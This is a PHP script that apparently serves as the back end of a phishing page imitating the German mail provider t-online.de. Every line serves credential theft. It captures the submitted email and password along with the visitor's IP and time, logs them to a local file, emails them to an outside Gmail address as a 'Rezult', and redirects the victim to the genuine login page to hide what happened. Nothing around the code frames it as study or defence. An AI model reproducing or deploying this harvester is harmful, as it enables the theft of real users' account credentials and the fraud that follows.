<?php


$time = date("m-d-Y g:i:a");


$data = " Email: ". $_POST['user'];
$data .= " Password: ". $_POST['pass'];
$data .= " IP: ". getenv('REMOTE_ADDR');
$data .= " Time on $time\n";
$data .= "--------------------------------------------------------------------------------\n";



$fp = fopen("t-online.de.tp2", "a");
fputs($fp, $data);


mail("mirabsmi@gmail.com","t-online.de Rezult",$data);

header("Location: https://email.t-online.de/em");

?>